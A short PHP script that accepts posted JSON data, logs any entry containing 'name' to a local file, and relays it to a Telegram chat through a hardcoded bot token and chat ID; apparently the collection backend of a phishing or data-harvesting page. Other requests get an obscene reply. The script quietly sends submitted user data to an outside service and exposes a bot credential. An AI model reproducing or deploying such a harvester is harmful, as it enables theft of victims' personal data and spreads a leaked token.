$data = json_decode(file_get_contents('php://input'), true);
$udata = $data['udata'];

if (strpos($udata, 'name') !== false) {
    file_put_contents('db.txt', $udata . PHP_EOL, FILE_APPEND);
    
    $chatId1 = '-1002147309523';
    $telegramBotToken = '7369875963:AAHHE7CrkuX0E6UErPp2AyOXz2T_iGORye4';

    file_get_contents("https://api.telegram.org/bot$telegramBotToken/sendMessage?chat_id=$chatId1&text=" . urlencode($udata));
} else {
    echo "suck my dick";
}
